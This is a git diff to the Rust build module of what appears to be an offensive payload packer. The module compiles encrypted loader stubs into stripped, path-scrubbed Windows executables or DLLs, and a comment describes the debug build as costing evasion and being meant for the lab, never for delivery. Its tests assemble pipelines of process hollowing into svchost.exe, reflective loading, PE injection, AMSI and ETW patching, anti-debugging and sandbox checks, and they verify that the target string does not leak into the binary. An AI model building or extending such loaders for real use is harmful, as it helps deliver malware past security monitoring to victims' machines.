@@ -9,7 +9,9 @@
 //!
 //! Note: we do not use `-C lto=fat` because the `.rlib` files produced by
 //! cargo do not carry bitcode (`.llvmbc`), so `lto=fat` with `--extern` fails.
-//! We keep `-O` for optimizing the stub itself.
+//! Size therefore comes from `opt-level="z"` (optimize for size, not speed),
+//! `codegen-units=1`, and `strip=symbols`: the stub is a small shim, so speed
+//! is irrelevant next to a smaller artifact.
 //!
 //! `build.output` reaches this module as [`CompileOptions`]: `strip` maps to
 //! `-C strip=...` and `trim_paths` to `--remap-path-prefix`, so both actually
@@ -20,7 +22,7 @@ use std::path::{Path, PathBuf};
 use std::process::Command;
 
 use super::{BuildError, Result};
-use crate::plan::schema::Arch;
+use crate::plan::schema::{Arch, OutputKind};
 
 /// `rustc` executable names (Windows and Unix).
 const RUSTC_NAMES: &[&str] = &["rustc.exe", "rustc"];
@@ -449,6 +451,9 @@ pub struct CompileOptions {
     /// Architecture the stub is compiled for: selects the `rustc` target and the
     /// matching dependency set (`build.output.arch`).
     pub arch: Arch,
+    /// What the artifact is: a binary or a host-loaded DLL
+    /// (`build.output.kind`).
+    pub kind: OutputKind,
 }
 
 impl Default for CompileOptions {
@@ -459,6 +464,7 @@ impl Default for CompileOptions {
             trim_paths: PathTrim::All,
             debug: false,
             arch: Arch::X64,
+            kind: OutputKind::Exe,
         }
     }
 }
@@ -489,6 +495,46 @@ fn strip_flag(strip: bool) -> &'static str {
     }
 }
 
+/// The `-C panic=...` strategy for the requested output.
+///
+/// A DLL runs inside a host process, so a panic must unwind into the entry
+/// block's `catch_unwind` instead of taking `java.exe`/`python.exe` down with
+/// it. An executable keeps `abort`: nothing catches a panic there, and the
+/// unwinding machinery is weight — and `panic` strings — the artifact does not
+/// need.
+fn panic_flag(kind: OutputKind) -> &'static str {
+    match kind {
+        OutputKind::Dll => "panic=unwind",
+        OutputKind::Exe => "panic=abort",
+    }
+}
+
+/// A valid `rustc` crate name derived from the output file's stem.
+///
+/// Without `--crate-name` the crate is named after the generated source
+/// (`main`), which is what ends up in panic locations and symbol paths. A DLL
+/// should report the name it is delivered under.
+fn crate_name(output: &Path) -> String {
+    let stem = output
+        .file_stem()
+        .and_then(OsStr::to_str)
+        .unwrap_or("loader");
+    let mut name: String = stem
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() || c == '_' {
+                c
+            } else {
+                '_'
+            }
+        })
+        .collect();
+    if name.is_empty() || name.starts_with(|c: char| c.is_ascii_digit()) {
+        name.insert(0, '_');
+    }
+    name
+}
+
 /// Appends one `--remap-path-prefix=<from>=<to>` pair to `flags`.
 fn push_remap(from: &Path, to: &str, flags: &mut Vec<String>) {
     flags.push("--remap-path-prefix".to_string());
@@ -507,6 +553,11 @@ fn push_remap(from: &Path, to: &str, flags: &mut Vec<String>) {
 /// remapping is skipped so a debugger can resolve the source files. All of that
 /// is what makes the artifact debuggable, and all of it costs evasion — hence
 /// `build.stub.debug` is for the lab, never for delivery.
+///
+/// A release build trades speed for size: `opt-level="z"` (the smallest code),
+/// `debug-assertions=off` and `overflow-checks=off` drop the assertion and
+/// overflow machinery, and `strip`/`trim_paths` remove symbols and leak-proof
+/// the paths.
 fn hardening_flags(
     options: CompileOptions,
     manifest_dir: &Path,
@@ -516,11 +567,15 @@ fn hardening_flags(
     if options.debug {
         flags.extend(["-C".to_string(), "opt-level=0".to_string()]);
         flags.extend(["-C".to_string(), "debuginfo=2".to_string()]);
+        flags.extend(["-C".to_string(), "debug-assertions=on".to_string()]);
+        flags.extend(["-C".to_string(), "overflow-checks=on".to_string()]);
         flags.extend(["-C".to_string(), strip_flag(false).to_string()]);
         return flags;
     }
 
-    flags.extend(["-O".to_string()]);
+    flags.extend(["-C".to_string(), "opt-level=z".to_string()]);
+    flags.extend(["-C".to_string(), "debug-assertions=off".to_string()]);
+    flags.extend(["-C".to_string(), "overflow-checks=off".to_string()]);
     flags.extend(["-C".to_string(), strip_flag(options.strip).to_string()]);
     match options.trim_paths {
         PathTrim::None => {}
@@ -550,12 +605,20 @@ pub fn compile_stub(
     if !is_native_target(options.arch) {
         cmd.arg("--target").arg(stub_target(options.arch));
     }
+    if options.kind == OutputKind::Dll {
+        // A library the host loads with the normal image loader. The crate name
+        // follows the output's stem so the artifact does not report the build's
+        // internal file name; the linker takes the export directory's `Name`
+        // from the link output itself.
+        cmd.arg("--crate-type").arg("cdylib");
+        cmd.arg("--crate-name").arg(crate_name(output));
+    }
     cmd.arg(stub_rs)
         .arg("--edition")
         .arg("2021")
         .args(hardening_flags(options, manifest_dir, home.as_deref()))
         .arg("-C")
-        .arg("panic=abort")
+        .arg(panic_flag(options.kind))
         .arg("-C")
         .arg("codegen-units=1")
         .arg("-C")
@@ -588,7 +651,8 @@ pub fn compile_stub(
         return Err(BuildError::CompilationFailed(stderr.to_string()));
     }
 
-    verify_pe_magic(output)
+    verify_pe_magic(output)?;
+    verify_output_kind(output, options.kind)
 }
 
 /// Verifies that the compiled stub is a Windows PE (`MZ` magic).
@@ -611,15 +675,63 @@ fn verify_pe_magic(path: &Path) -> Result<()> {
     Ok(())
 }
 
+/// Verifies that the compiled image is the kind `build.output.kind` asked for.
+///
+/// `rustc` links a `cdylib` from any source, including one whose entry points
+/// were never exported (a name typo, a missing `#[no_mangle]`); the result is a
+/// DLL no host can start, and nothing else in the build would notice.
+/// `IMAGE_FILE_DLL` is the header bit that tells the two apart. An executable is
+/// checked too: it catches an entry block that was rendered for a DLL into a
+/// binary build.
+fn verify_output_kind(path: &Path, kind: OutputKind) -> Result<()> {
+    let bytes = std::fs::read(path)?;
+    let info = crate::engine::pe::parse(&bytes).map_err(|e| {
+        BuildError::CompilationFailed(format!(
+            "the compiled stub '{}' is not a valid PE: {e}",
+            path.display()
+        ))
+    })?;
+    let is_dll = crate::engine::pe::is_dll(info.characteristics);
+    match (kind, is_dll) {
+        (OutputKind::Dll, false) => Err(BuildError::CompilationFailed(format!(
+            "'{}' was built as a DLL (build.output.kind: dll) but the compiled image is an \
+             executable: no export was linked",
+            path.display()
+        ))),
+        (OutputKind::Exe, true) => Err(BuildError::CompilationFailed(format!(
+            "'{}' was built as an executable but the compiled image is a DLL",
+            path.display()
+        ))),
+        _ => Ok(()),
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
 
     use crate::plan::schema::PayloadFormat;
+    use crate::techniques::{RuntimeStep, TechniqueKind};
 
     #[test]
     fn find_executable_in_empty_path_is_none() {
         assert!(find_executable_in_path(OsStr::new(""), RUSTC_NAMES).is_none());
+    }
+
+    #[test]
+    fn a_dll_build_unwinds_and_an_executable_aborts() {
+        assert_eq!(panic_flag(OutputKind::Dll), "panic=unwind");
+        assert_eq!(panic_flag(OutputKind::Exe), "panic=abort");
+    }
+
+    #[test]
+    fn the_crate_name_follows_the_output_stem() {
+        assert_eq!(crate_name(Path::new("picaro.dll")), "picaro");
+        assert_eq!(crate_name(Path::new("/tmp/loader-x64.dll")), "loader_x64");
+        // A Rust crate name may not start with a digit, and an empty stem needs
+        // some name at all.
+        assert_eq!(crate_name(Path::new("2fast.dll")), "_2fast");
+        assert_eq!(crate_name(Path::new("")), "loader");
     }
 
     /// The stub target follows the requested architecture (and the host ABI on
@@ -726,6 +838,7 @@ dependencies = [
                 trim_paths: PathTrim::None,
                 debug: false,
                 arch: Arch::X64,
+                kind: OutputKind::Exe,
             },
             manifest,
             None,
@@ -738,6 +851,7 @@ dependencies = [
                 trim_paths: PathTrim::None,
                 debug: false,
                 arch: Arch::X64,
+                kind: OutputKind::Exe,
             },
             manifest,
             None,
@@ -754,6 +868,7 @@ dependencies = [
                 trim_paths: PathTrim::None,
                 debug: false,
                 arch: Arch::X64,
+                kind: OutputKind::Exe,
             },
             Path::new("/proj"),
             Some(Path::new("/home/dev")),
@@ -769,6 +884,7 @@ dependencies = [
                 trim_paths: PathTrim::Relative,
                 debug: false,
                 arch: Arch::X64,
+                kind: OutputKind::Exe,
             },
             Path::new("/proj"),
             Some(Path::new("/home/dev")),
@@ -784,6 +900,7 @@ dependencies = [
                 trim_paths: PathTrim::All,
                 debug: false,
                 arch: Arch::X64,
+                kind: OutputKind::Exe,
             },
             Path::new("/proj"),
             Some(Path::new("/home/dev/.cargo")),
@@ -799,6 +916,7 @@ dependencies = [
                 trim_paths: PathTrim::All,
                 debug: false,
                 arch: Arch::X64,
+                kind: OutputKind::Exe,
             },
             Path::new("/proj"),
             None,
@@ -816,6 +934,7 @@ dependencies = [
                 trim_paths: PathTrim::All,
                 debug: true,
                 arch: Arch::X64,
+                kind: OutputKind::Exe,
             },
             Path::new("/proj"),
             Some(Path::new("/home/dev/.cargo")),
@@ -823,10 +942,39 @@ dependencies = [
         assert!(flags.contains(&"opt-level=0".to_string()));
         assert!(flags.contains(&"debuginfo=2".to_string()));
         assert!(flags.contains(&"strip=none".to_string()));
+        assert!(flags.contains(&"debug-assertions=on".to_string()));
+        assert!(flags.contains(&"overflow-checks=on".to_string()));
         assert!(!flags.contains(&"strip=symbols".to_string()));
         assert!(!flags.contains(&"-O".to_string()));
         // Paths are kept so a debugger can open the generated stub.
         assert!(remaps(&flags).is_empty(), "flags: {flags:?}");
+    }
+
+    /// A release build optimizes for size: the smallest opt level and no
+    /// assertion/overflow machinery. `codegen-units=1` (set in `compile_stub`)
+    /// and `strip=symbols` finish the job.
+    #[test]
+    fn release_build_optimizes_for_size() {
+        let flags = hardening_flags(
+            CompileOptions {
+                strip: true,
+                trim_paths: PathTrim::None,
+                debug: false,
+                arch: Arch::X64,
+                kind: OutputKind::Exe,
+            },
+            Path::new("/proj"),
+            None,
+        );
+        assert!(
+            flags.contains(&"opt-level=z".to_string()),
+            "flags: {flags:?}"
+        );
+        assert!(flags.contains(&"debug-assertions=off".to_string()));
+        assert!(flags.contains(&"overflow-checks=off".to_string()));
+        assert!(flags.contains(&"strip=symbols".to_string()));
+        assert!(!flags.contains(&"-O".to_string()));
+        assert!(!flags.contains(&"opt-level=0".to_string()));
     }
 
     /// Full packing flow with a 1 KB payload.
@@ -849,35 +997,33 @@ dependencies = [
         std::fs::write(build_dir.join("payload.bin"), &encrypted.ciphertext).unwrap();
 
         let tpl_path = Path::new(env!("CARGO_MANIFEST_DIR"))
-            .join("templates")
-            .join("stub")
+            .join("src").join("engine").join("templates")
             .join("main.rs.tpl");
         let template = std::fs::read_to_string(tpl_path).unwrap();
-        let params = crate::engine::stub::StubParams {
-            nonce: encrypted.nonce,
-            key: encrypted.key,
-            ciphertext: encrypted.ciphertext.clone(),
-            plaintext_len: encrypted.plaintext_len,
-            payload_format: PayloadFormat::Pe,
-            payload_export: None,
-            stub_marker: crate::engine::stub::generate_stub_marker(),
-            payload_path: "payload.bin".to_string(),
-            build_args: std::collections::BTreeMap::new(),
-            payload_args: Vec::new(),
-            args_mode: crate::engine::args::ArgsMode::Join,
-            debug: false,
-            windows_subsystem: false,
-        };
-        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing {
+        let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
             params: crate::techniques::process_hollowing::Params {
+                payload: None,
                 target: r"C:\Windows\System32\svchost.exe".to_string(),
             },
-        }];
+        })];
+        let params = crate::engine::steps::test_params(
+            &pipeline,
+            &encrypted,
+            "payload.bin",
+            PayloadFormat::Pe,
+            None,
+            false,
+        );
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
         let syscalls = crate::engine::syscalls::SyscallsConfig::default();
-        let stub_src =
-            crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings, &syscalls)
-                .unwrap();
+        let stub_src = crate::engine::steps::render_builtin(
+            &template,
+            &params,
+            &strings,
+            &syscalls,
+            &crate::engine::api_resolution::ApiResolutionConfig::default(),
+        )
+        .unwrap();
         let stub_path = build_dir.join("main.rs");
         std::fs::write(&stub_path, stub_src).unwrap();
 
@@ -916,15 +1062,13 @@ dependencies = [
 
         let template = std::fs::read_to_string(
             Path::new(env!("CARGO_MANIFEST_DIR"))
-                .join("templates")
-                .join("stub")
+                .join("src").join("engine").join("templates")
                 .join("main.rs.tpl"),
         )
         .unwrap();
 
         let deps = locate_stub_deps(Arch::X64).unwrap();
 
-        let marker = "STUB_MARKER_test00000000".to_string();
         let target = r"C:\Windows\System32\svchost.exe".to_string();
 
         let strategies = [
@@ -945,32 +1089,26 @@ dependencies = [
         ];
 
         for (name, strings) in strategies {
-            let params = crate::engine::stub::StubParams {
-                nonce: encrypted.nonce,
-                key: encrypted.key,
-                ciphertext: encrypted.ciphertext.clone(),
-                plaintext_len: encrypted.plaintext_len,
-                payload_format: PayloadFormat::Pe,
-                payload_export: None,
-                stub_marker: marker.clone(),
-                payload_path: "payload.bin".to_string(),
-                build_args: std::collections::BTreeMap::new(),
-                payload_args: Vec::new(),
-                args_mode: crate::engine::args::ArgsMode::Join,
-                debug: false,
-                windows_subsystem: false,
-            };
-            let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing {
+            let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
                 params: crate::techniques::process_hollowing::Params {
+                    payload: None,
                     target: target.clone(),
                 },
-            }];
-            let stub_src = crate::engine::stub::render_main_rs(
+            })];
+            let params = crate::engine::steps::test_params(
+                &pipeline,
+                &encrypted,
+                "payload.bin",
+                PayloadFormat::Pe,
+                None,
+                false,
+            );
+            let stub_src = crate::engine::steps::render_builtin(
                 &template,
                 &params,
-                &pipeline,
                 &strings,
                 &crate::engine::syscalls::SyscallsConfig::default(),
+                &crate::engine::api_resolution::ApiResolutionConfig::default(),
             )
             .unwrap();
             let stub_path = build_dir.join(format!("main_{name}.rs"));
@@ -980,10 +1118,6 @@ dependencies = [
             compile_stub(&stub_path, &out, &deps, CompileOptions::default()).unwrap();
 
             let binary = std::fs::read(&out).unwrap();
-            assert!(
-                !binary.windows(marker.len()).any(|w| w == marker.as_bytes()),
-                "{name}: marker leaked into the binary"
-            );
             assert!(
                 !binary.windows(target.len()).any(|w| w == target.as_bytes()),
                 "{name}: hollowing target leaked into the binary"
@@ -1017,8 +1151,7 @@ dependencies = [
 
         let template = std::fs::read_to_string(
             Path::new(env!("CARGO_MANIFEST_DIR"))
-                .join("templates")
-                .join("stub")
+                .join("src").join("engine").join("templates")
                 .join("main.rs.tpl"),
         )
         .unwrap();
@@ -1040,27 +1173,20 @@ dependencies = [
                 vec![step]
             };
 
-            let params = crate::engine::stub::StubParams {
-                nonce: encrypted.nonce,
-                key: encrypted.key,
-                ciphertext: encrypted.ciphertext.clone(),
-                plaintext_len: encrypted.plaintext_len,
-                payload_format: PayloadFormat::Pe,
-                payload_export: None,
-                stub_marker: crate::engine::stub::generate_stub_marker(),
-                payload_path: "payload.bin".to_string(),
-                build_args: std::collections::BTreeMap::new(),
-                payload_args: Vec::new(),
-                args_mode: crate::engine::args::ArgsMode::Join,
-                debug: false,
-                windows_subsystem: false,
-            };
-            let stub_src = crate::engine::stub::render_main_rs(
+            let params = crate::engine::steps::test_params(
+                &pipeline,
+                &encrypted,
+                "payload.bin",
+                PayloadFormat::Pe,
+                None,
+                false,
+            );
+            let stub_src = crate::engine::steps::render_builtin(
                 &template,
                 &params,
-                &pipeline,
                 &strings,
                 &crate::engine::syscalls::SyscallsConfig::default(),
+                &crate::engine::api_resolution::ApiResolutionConfig::default(),
             )
             .unwrap();
             let stub_path = build_dir.join(format!("main_{}.rs", def.name));
@@ -1108,28 +1234,26 @@ dependencies = [
         )
         .unwrap();
 
-        let params = crate::engine::stub::StubParams {
-            nonce: [0u8; 24],
-            key: [0u8; 32],
-            ciphertext: vec![0xAA, 0xBB, 0xCC, 0xDD],
-            plaintext_len: 4,
-            payload_format: PayloadFormat::Pe,
-            payload_export: None,
-            stub_marker: crate::engine::stub::generate_stub_marker(),
-            payload_path: "payload.bin".to_string(),
-            build_args: std::collections::BTreeMap::new(),
-            payload_args: Vec::new(),
-            args_mode: crate::engine::args::ArgsMode::Join,
-            debug: false,
-            windows_subsystem: false,
-        };
+        let params = crate::engine::steps::test_params(
+            &[],
+            &crate::engine::crypto::EncryptedPayload {
+                nonce: [0u8; 24],
+                key: [0u8; 32],
+                ciphertext: vec![0xAA, 0xBB, 0xCC, 0xDD],
+                plaintext_len: 4,
+            },
+            "payload.bin",
+            PayloadFormat::Pe,
+            None,
+            false,
+        );
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
-        let rendered = crate::engine::stub::render_custom_stub(
+        let rendered = crate::engine::steps::render_custom(
             &template,
             &params,
-            &[],
             &strings,
             &crate::engine::syscalls::SyscallsConfig::default(),
+            &crate::engine::api_resolution::ApiResolutionConfig::default(),
         )
         .unwrap();
         assert!(rendered.warnings.is_empty(), "no techniques declared");
@@ -1167,35 +1291,33 @@ dependencies = [
 
         let template = std::fs::read_to_string(
             Path::new(env!("CARGO_MANIFEST_DIR"))
-                .join("templates")
-                .join("stub")
+                .join("src").join("engine").join("templates")
                 .join("main.rs.tpl"),
         )
         .unwrap();
-        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing {
+        let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
             params: crate::techniques::process_hollowing::Params {
+                payload: None,
                 target: r"C:\Windows\System32\svchost.exe".to_string(),
             },
-        }];
-        let params = crate::engine::stub::StubParams {
-            nonce: encrypted.nonce,
-            key: encrypted.key,
-            ciphertext: encrypted.ciphertext.clone(),
-            plaintext_len: encrypted.plaintext_len,
-            payload_format: PayloadFormat::Pe,
-            payload_export: None,
-            stub_marker: crate::engine::stub::generate_stub_marker(),
-            payload_path: "payload.bin".to_string(),
-            build_args: std::collections::BTreeMap::new(),
-            payload_args: Vec::new(),
-            args_mode: crate::engine::args::ArgsMode::Join,
-            debug: false,
-            windows_subsystem: false,
-        };
+        })];
+        let params = crate::engine::steps::test_params(
+            &pipeline,
+            &encrypted,
+            "payload.bin",
+            PayloadFormat::Pe,
+            None,
+            false,
+        );
         let strings = crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap();
-        let stub_src =
-            crate::engine::stub::render_main_rs(&template, &params, &pipeline, &strings, syscalls)
-                .unwrap();
+        let stub_src = crate::engine::steps::render_builtin(
+            &template,
+            &params,
+            &strings,
+            syscalls,
+            &crate::engine::api_resolution::ApiResolutionConfig::default(),
+        )
+        .unwrap();
         let stub_path = build_dir.join(format!("main_{name}.rs"));
         std::fs::write(&stub_path, stub_src).unwrap();
 
@@ -1453,32 +1575,24 @@ dependencies = [
     /// Renders a custom stub template with a fresh key and a small payload.
     ///
     /// The pipeline only drives the shared blocks (args/imports/syscalls); a
-    /// custom template that ignores `$EXECUTION_BLOCK$` never pulls in a
-    /// technique fragment, which is what lets the x86 toolchain be tested while
-    /// every fragment is still x64-only.
+    /// custom template that ignores `$STEP_MODULES$` never pulls in a technique
+    /// fragment, which is what lets the x86 toolchain be tested while every
+    /// fragment is still x64-only.
     fn render_custom(template: &str, pipeline: &[crate::techniques::RuntimeStep]) -> String {
         let plaintext: Vec<u8> = (0..64u32).map(|i| i as u8).collect();
         let key = crate::engine::crypto::generate_key();
         let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();
-        let params = crate::engine::stub::StubParams {
-            nonce: encrypted.nonce,
-            key: encrypted.key,
-            ciphertext: encrypted.ciphertext.clone(),
-            plaintext_len: encrypted.plaintext_len,
-            payload_format: PayloadFormat::Pe,
-            payload_export: None,
-            stub_marker: crate::engine::stub::generate_stub_marker(),
-            payload_path: "payload.bin".to_string(),
-            build_args: std::collections::BTreeMap::new(),
-            payload_args: Vec::new(),
-            args_mode: crate::engine::args::ArgsMode::Join,
-            debug: false,
-            windows_subsystem: false,
-        };
-        crate::engine::stub::render_custom_stub_with(
+        let params = crate::engine::steps::test_params(
+            pipeline,
+            &encrypted,
+            "payload.bin",
+            PayloadFormat::Pe,
+            None,
+            false,
+        );
+        crate::engine::steps::render_custom(
             template,
             &params,
-            pipeline,
             &crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap(),
             &crate::engine::syscalls::SyscallsConfig::default(),
             &crate::engine::api_resolution::ApiResolutionConfig::default(),
@@ -1493,8 +1607,7 @@ dependencies = [
     fn render_builtin(pipeline: &[crate::techniques::RuntimeStep]) -> (String, Vec<u8>) {
         let template = std::fs::read_to_string(
             Path::new(env!("CARGO_MANIFEST_DIR"))
-                .join("templates")
-                .join("stub")
+                .join("src").join("engine").join("templates")
                 .join("main.rs.tpl"),
         )
         .unwrap();
@@ -1502,25 +1615,17 @@ dependencies = [
         let plaintext: Vec<u8> = (0..256u32).map(|i| i as u8).collect();
         let key = crate::engine::crypto::generate_key();
         let encrypted = crate::engine::crypto::encrypt_payload(&plaintext, &key).unwrap();
-        let params = crate::engine::stub::StubParams {
-            nonce: encrypted.nonce,
-            key: encrypted.key,
-            ciphertext: encrypted.ciphertext.clone(),
-            plaintext_len: encrypted.plaintext_len,
-            payload_format: PayloadFormat::Pe,
-            payload_export: None,
-            stub_marker: crate::engine::stub::generate_stub_marker(),
-            payload_path: "payload.bin".to_string(),
-            build_args: std::collections::BTreeMap::new(),
-            payload_args: Vec::new(),
-            args_mode: crate::engine::args::ArgsMode::Join,
-            debug: false,
-            windows_subsystem: false,
-        };
-        let source = crate::engine::stub::render_main_rs_with(
+        let params = crate::engine::steps::test_params(
+            pipeline,
+            &encrypted,
+            "payload.bin",
+            PayloadFormat::Pe,
+            None,
+            false,
+        );
+        let source = crate::engine::steps::render_builtin(
             &template,
             &params,
-            pipeline,
             &crate::engine::obfuscation::StringsConfig::from_yaml(None).unwrap(),
             &crate::engine::syscalls::SyscallsConfig::default(),
             &crate::engine::api_resolution::ApiResolutionConfig::default(),
@@ -1592,7 +1697,7 @@ dependencies = [
     /// offsets, 4-byte thunks and `IMAGE_ORDINAL_FLAG32`).
     ///
     /// The pipeline is only there to make the renderer emit `$ARGS_BLOCK$` /
-    /// `$IMPORTS_BLOCK$`; the template ignores `$EXECUTION_BLOCK$`, so no x64
+    /// `$IMPORTS_BLOCK$`; the template ignores `$STEP_MODULES$`, so no x64
     /// technique fragment is linked in.
     #[test]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
@@ -1610,19 +1715,16 @@ fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
     out
 }
 
-fn main() {
-    let len = $PAYLOAD_LEN$;
-    println!("{len}");
-}
+fn main() {}
 
 $SYSCALLS_BLOCK$
 $ARGS_BLOCK$
 $IMPORTS_BLOCK$
 "#;
 
-        let pipeline = vec![crate::techniques::RuntimeStep::ReflectiveLoading {
-            params: crate::techniques::reflective_loading::Params {},
-        }];
+        let pipeline = vec![RuntimeStep::new(TechniqueKind::ReflectiveLoading {
+            params: crate::techniques::reflective_loading::Params::default(),
+        })];
         let source = render_custom(TEMPLATE, &pipeline);
         assert!(source.contains("fs:[0x30]"), "the x86 PEB read is missing");
         assert!(
@@ -1639,9 +1741,9 @@ $IMPORTS_BLOCK$
     #[test]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_a_reflective_stub_for_i686() {
-        let pipeline = vec![crate::techniques::RuntimeStep::ReflectiveLoading {
-            params: crate::techniques::reflective_loading::Params {},
-        }];
+        let pipeline = vec![RuntimeStep::new(TechniqueKind::ReflectiveLoading {
+            params: crate::techniques::reflective_loading::Params::default(),
+        })];
         let (source, ciphertext) = render_builtin(&pipeline);
 
         let info = compile_i686(&source, Some(&ciphertext), "reflective");
@@ -1654,12 +1756,28 @@ $IMPORTS_BLOCK$
     #[test]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_a_hollowing_stub_for_i686() {
-        let pipeline = vec![crate::techniques::RuntimeStep::ProcessHollowing {
+        let pipeline = vec![RuntimeStep::new(TechniqueKind::ProcessHollowing {
             params: crate::techniques::process_hollowing::Params::default(),
-        }];
+        })];
         let (source, ciphertext) = render_builtin(&pipeline);
 
         let info = compile_i686(&source, Some(&ciphertext), "hollowing");
+        assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
+        assert_eq!(info.arch(), Some(Arch::X86));
+    }
+
+    /// M2-bis: the PE-injection fragment compiles for i686 — the PE32 parser and
+    /// the target-resident TLS prologue (hand-written x86 machine code that runs
+    /// `TlsSetValue` + the payload's callbacks before the entry point).
+    #[test]
+    #[ignore = "requires rustc and the workspace built for the i686 target"]
+    fn compiles_a_pe_injection_stub_for_i686() {
+        let pipeline = vec![RuntimeStep::new(TechniqueKind::PeInjection {
+            params: crate::techniques::pe_injection::Params::default(),
+        })];
+        let (source, ciphertext) = render_builtin(&pipeline);
+
+        let info = compile_i686(&source, Some(&ciphertext), "pe_injection");
         assert_eq!(info.machine, crate::engine::pe::IMAGE_FILE_MACHINE_I386);
         assert_eq!(info.arch(), Some(Arch::X86));
     }
@@ -1670,30 +1788,28 @@ $IMPORTS_BLOCK$
     #[test]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_the_x86_preparations_for_i686() {
-        use crate::techniques::{
-            anti_debug, bouncer, patch_amsi, patch_etw, reflective_loading, RuntimeStep,
-        };
+        use crate::techniques::{anti_debug, bouncer, patch_amsi, patch_etw, reflective_loading};
         let pipeline = vec![
-            RuntimeStep::AntiDebug {
+            RuntimeStep::new(TechniqueKind::AntiDebug {
                 params: anti_debug::Params::default(),
-            },
-            RuntimeStep::PatchAmsi {
+            }),
+            RuntimeStep::new(TechniqueKind::PatchAmsi {
                 params: patch_amsi::Params::default(),
-            },
-            RuntimeStep::PatchEtw {
+            }),
+            RuntimeStep::new(TechniqueKind::PatchEtw {
                 params: patch_etw::Params::default(),
-            },
-            RuntimeStep::Bouncer {
+            }),
+            RuntimeStep::new(TechniqueKind::Bouncer {
                 params: bouncer::Params {
                     hostname: Some("WORKSTATION-*".to_string()),
                     not_in_vm: Some(true),
                     min_ram_mb: Some(2048),
                     ..bouncer::Params::default()
                 },
-            },
-            RuntimeStep::ReflectiveLoading {
+            }),
+            RuntimeStep::new(TechniqueKind::ReflectiveLoading {
                 params: reflective_loading::Params::default(),
-            },
+            }),
         ];
         let (source, ciphertext) = render_builtin(&pipeline);
 
@@ -1708,9 +1824,9 @@ $IMPORTS_BLOCK$
     #[test]
     #[ignore = "requires rustc and the workspace built for the i686 target"]
     fn compiles_a_dotnet_hosting_stub_for_i686() {
-        let pipeline = vec![crate::techniques::RuntimeStep::DotnetHosting {
-            params: crate::techniques::dotnet_hosting::Params {},
-        }];
+        let pipeline = vec![RuntimeStep::new(TechniqueKind::DotnetHosting {
+            params: crate::techniques::dotnet_hosting::Params::default(),
+        })];
         let (source, ciphertext) = render_builtin(&pipeline);
 
         let info = compile_i686(&source, Some(&ciphertext), "dotnet_hosting");
